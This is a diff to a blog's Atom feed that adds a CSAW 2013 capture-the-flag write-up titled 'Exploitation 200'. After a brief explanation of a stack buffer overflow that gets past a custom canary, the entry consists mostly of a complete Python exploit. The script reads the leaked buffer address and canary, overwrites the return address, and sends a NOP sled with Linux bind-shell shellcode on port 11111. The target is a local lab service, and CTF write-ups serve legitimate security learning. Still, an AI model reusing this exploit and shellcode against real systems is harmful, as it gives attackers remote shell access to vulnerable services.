@@ -4,7 +4,7 @@
   <title><![CDATA[ejohn]]></title>
   <link href="http://ejohn.github.io/atom.xml" rel="self"/>
   <link href="http://ejohn.github.io/"/>
-  <updated>2013-09-23T18:05:16-04:00</updated>
+  <updated>2013-09-23T19:03:15-04:00</updated>
   <id>http://ejohn.github.io/</id>
   <author>
     <name><![CDATA[ejohn]]></name>
@@ -12,6 +12,112 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW 2013: Exploitation 200]]></title>
+    <link href="http://ejohn.github.io/blog/2013/09/23/csaw-2013-exploitation-200/"/>
+    <updated>2013-09-23T18:28:00-04:00</updated>
+    <id>http://ejohn.github.io/blog/2013/09/23/csaw-2013-exploitation-200</id>
+    <content type="html"><![CDATA[<p>This level 200 challenge has a very obvious buffer overflow vulnerability but with a little twist, the devious geniuses at ISIS labs implemented their own custom stack canary buffer overflow protection! Well given that it is a 200 level challenge they made things a lot easier by sending us the canary value used and the address of the buffer on the stack. With these two values in hand its a straight forward buffer overflow exploit.</p>
+
+<h3>Exploit</h3>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">pack</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">31338</span><span class="p">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#Receive the address of the buffer on the stack</span>
+</span><span class='line'><span class="n">buffer_address</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span><span class='line'><span class="n">buffer_address</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">buffer_address</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#Calculate the offset from the start of the buffer to the location of the shellcode.</span>
+</span><span class='line'><span class="c">#Padding: 2048, Canary: 4, Padding: 12, EIP: 4, NOP sled + payload</span>
+</span><span class='line'><span class="c">#Jump to the middle of the NOP sled</span>
+</span><span class='line'><span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2048</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">buffer_address</span> <span class="o">+</span> <span class="n">offset</span>
+</span><span class='line'><span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="n">shellcode_addr</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c">#Receive the canary.</span>
+</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="c">##http://www.shell-storm.org/shellcode/files/shellcode-836.php</span>
+</span><span class='line'><span class="c">##Bind shell on port 11111</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="p">(</span> <span class="s">&quot;</span><span class="se">\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68\x2b\x67</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80\x89</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62</span><span class="s">&quot;</span>
+</span><span class='line'>          <span class="s">&quot;</span><span class="se">\x69\x6e\x89\xe3\x41\xcd\x80</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">2048</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="s">&quot;AAAABBBBCCCC&quot;</span> <span class="o">+</span> <span class="n">shellcode_addr</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">64</span> <span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[CSAW 2013: Exploitation 300]]></title>
